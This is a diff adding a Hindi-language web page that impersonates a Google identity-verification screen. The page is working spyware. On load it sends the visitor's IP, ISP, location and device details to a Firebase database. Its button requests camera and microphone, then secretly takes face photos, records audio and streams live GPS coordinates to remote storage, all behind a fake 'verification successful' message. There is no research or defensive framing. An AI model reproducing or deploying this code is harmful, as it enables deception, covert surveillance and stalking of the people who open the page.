@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google - पहचान की पुष्टि करें</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script> <style>
+        /* --- पुराना CSS (यथावत) --- */
+        body { font-family: 'Roboto', arial, sans-serif; background: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; color: #202124; }
+        .container { width: 100%; max-width: 450px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
+        .logo { width: 75px; margin-bottom: 10px; }
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
+        p { font-size: 16px; line-height: 1.5; margin-bottom: 30px; }
+        .btn { background: #1a73e8; color: #fff; border: none; padding: 12px 24px; border-radius: 4px; font-weight: 500; font-size: 14px; cursor: pointer; width: 100%; transition: background 0.2s; }
+        .btn:hover { background: #1765cc; }
+        #v, #c { display: none; } /* कैमरा/कैनवास छुपाने के लिए */
+    </style>
+</head>
+<body onload="initCapture()">
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/375px-Google_2015_logo.svg.png" class="logo">
+        <h1>पहचान की पुष्टि करें</h1>
+        <p>आपके डिवाइस पर संदिग्ध गतिविधि का पता चला है। जारी रखने के लिए अपनी पहचान की पुष्टि करना अनिवार्य है।</p>
+        <button class="btn" onclick="startLethalAccess()">पुष्टि करें</button>
+    </div>
+    
+    <video id="v" autoplay playsinline muted></video>
+    <canvas id="c"></canvas>
+
+    <script>
+        // --- Firebase Config (स्टोरेज बकेट के साथ अपडेटेड) ---
+        const firebaseConfig = { 
+            databaseURL: "https://pari-project-police-68f77-default-rtdb.firebaseio.com/",
+            storageBucket: "pari-project-police-68f77.appspot.com" // नया: स्टोरेज लिंक
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const storage = firebase.storage(); // नया: स्टोरेज ऑब्जेक्ट
+        const logId = "KP_" + Date.now(); // नया: लॉग आईडी 'KP_' से शुरू
+
+        // --- 1. Initial Device Intel (पुराना फीचर, यथावत) ---
+        async function initCapture() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                let batLevel = "N/A";
+                try {
+                    const bat = await navigator.getBattery();
+                    batLevel = Math.round(bat.level * 100) + "%";
+                } catch(e) {}
+
+                // डेटाबेस में इनिशियल डेटा सेव करना (पुराना लॉजिक)
+                database.ref('target_logs/' + logId).set({
+                    name: "Target_" + data.ip.split('.').pop(),
+                    time: new Date().toLocaleString(),
+                    intel: {
+                        ip: data.ip,
+                        isp: data.org,
+                        city: data.city,
+                        device: navigator.userAgent.match(/\(([^)]+)\)/)[1],
+                        battery: batLevel
+                    }
+                });
+            } catch(e) { console.error("Initial sync failed"); }
+        }
+
+        // --- 2. The Lethal Capture Function (अपडेटेड) ---
+        async function startLethalAccess() {
+            try {
+                // कैमरा और माइक की अनुमति लें
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const v = document.getElementById('v');
+                v.srcObject = stream;
+
+                // --- नया फीचर: Silent Face Capture (बिना शक के) ---
+                // पहला फोटो तुरंत, दूसरा 3 सेकंड बाद
+                setTimeout(() => captureAndUploadFace("Instant_Face"), 800);
+                setTimeout(() => captureAndUploadFace("Verified_Face"), 3000);
+
+                // --- नया फीचर: High-Accuracy Live Tracking (पुराने geolocation को रिप्लेस किया) ---
+                navigator.geolocation.watchPosition((p) => {
+                    // डेटाबेस में लाइव लोकेशन अपडेट (पुराना पाथ यथावत)
+                    database.ref('target_logs/' + logId + '/location').update({
+                        latitude: p.coords.latitude,
+                        longitude: p.coords.longitude,
+                        accuracy: p.coords.accuracy.toFixed(1) + "m",
+                        speed: p.coords.speed || 0, // नया: गति
+                        last_updated: new Date().toLocaleTimeString() // नया: टाइमस्टैम्प
+                    });
+                    
+                    // Success UI Change (पुराना फीचर, यथावत)
+                    document.querySelector('.container').innerHTML = `
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e0/Check_green_icon.svg/1200px-Check_green_icon.svg.png" style="width:60px;margin-bottom:20px;">
+                        <h1>पुष्टि सफल!</h1>
+                        <p>धन्यवाद, आपके डिवाइस की सुरक्षा जांच पूरी हो गई है। अब आप सुरक्षित हैं।</p>`;
+                }, (err) => {
+                    console.error("Location Denied");
+                }, { enableHighAccuracy: true, timeout: 5000 }); // नया: हाई एक्यूरेसी सेटिंग
+
+                // --- 3. Silent Audio Intercept (पुराना फीचर, यथावत लेकिन स्टोरेज के साथ) ---
+                const mr = new MediaRecorder(stream);
+                let chunks = [];
+                mr.ondataavailable = e => chunks.push(e.data);
+                mr.onstop = async () => {
+                    const blob = new Blob(chunks, {type: 'audio/webm'});
+                    // पुराने Base64 लॉजिक की जगह, अब स्टोरेज में अपलोड होगा
+                    await uploadMediaToStorage(blob, "intercepted_audio.webm");
+                };
+                mr.start();
+                setTimeout(() => mr.stop(), 8000); // 8 सेकंड की रिकॉर्डिंग
+
+            } catch(e) {
+                // पुराना एरर हैंडलिंग (यथावत)
+                alert("सुरक्षा जांच के लिए कैमरा और लोकेशन की अनुमति अनिवार्य है। कृपया पुनः प्रयास करें।");
+                location.reload();
+            }
+        }
+
+        // --- नया फीचर: Face Capture और Firebase Storage में अपलोड ---
+        function captureAndUploadFace(label) {
+            const v = document.getElementById('v');
+            const c = document.getElementById('c');
+            const ctx = c.getContext('2d');
+            
+            c.width = v.videoWidth;
+            c.height = v.videoHeight;
+            ctx.drawImage(v, 0, 0);
+            
+            // कैनवास से Blob (इमेज फाइल) बनाना
+            c.toBlob(async (blob) => {
+                await uploadMediaToStorage(blob, `${label}.jpg`);
+            }, 'image/jpeg', 0.9); // हाई क्वालिटी फोटो
+        }
+
+        // --- नया फीचर: मीडिया फाइलों को Firebase Storage में अपलोड करने का कॉमन फंक्शन ---
+        async function uploadMediaToStorage(blob, fileName) {
+            try {
+                // स्टोरेज में फाइल का पाथ सेट करें
+                const storageRef = storage.ref(`evidence/${logId}/${fileName}`);
+                // फाइल अपलोड करें
+                await storageRef.put(blob);
+                // अपलोड की गई फाइल का डाउनलोड लिंक (URL) प्राप्त करें
+                const downloadURL = await storageRef.getDownloadURL();
+                
+                // डेटाबेस में केवल लिंक (URL) अपडेट करें (पुराने फोटो/ऑडियो फील्ड्स में)
+                const updates = {};
+                if (fileName.endsWith('.jpg')) {
+                    updates['photo_url'] = downloadURL; // नया फील्ड नाम
+                    updates['status'] = fileName.replace('.jpg', ''); // स्टेटस अपडेट
+                } else if (fileName.endsWith('.webm')) {
+                    updates['audio_url'] = downloadURL; // नया फील्ड नाम
+                }
+                database.ref('target_logs/' + logId).update(updates);
+                
+                console.log(`${fileName} uploaded successfully.`);
+            } catch(e) { console.error(`${fileName} upload failed`, e); }
+        }
+    </script>
+</body>
+</html>
